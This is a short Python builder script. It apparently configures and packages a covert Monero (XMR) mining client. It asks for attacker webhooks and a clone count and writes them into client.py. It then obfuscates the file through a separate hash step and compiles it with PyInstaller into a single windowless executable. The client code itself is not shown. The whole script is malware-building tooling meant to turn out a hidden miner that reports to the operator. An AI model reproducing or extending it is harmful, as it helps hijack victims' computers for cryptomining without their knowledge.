import uuid
import base64
import hashlib
import os 
import pyImpossibleObf

key ="loooood"
webhook = input("Webhook : ")
webhookstats = input("XMR Miner Stats : Webhook : ")
if(webhookstats == ""):
	webhookstats == "NoWebhook"
processnumbers = input("Number of clones (default : 3) : ")
if processnumbers == "":
	processnumbers = "3"
filecontent = open("client.py", "r").read()
filecontent = filecontent.replace("webhook667", str(webhook)).replace("processnumbers", str(processnumbers)).replace("NoWebhook667EKIP", str(webhookstats))
open("client.py", "w",encoding="utf-8").write(str(filecontent))
print("[.] Replaced variables in file.")

val = input("Do you use py, python or python3 filename.py to launch file? (py/python/python3) : ")

os.system(val + " hash.py")

os.system(val + ' -m PyInstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
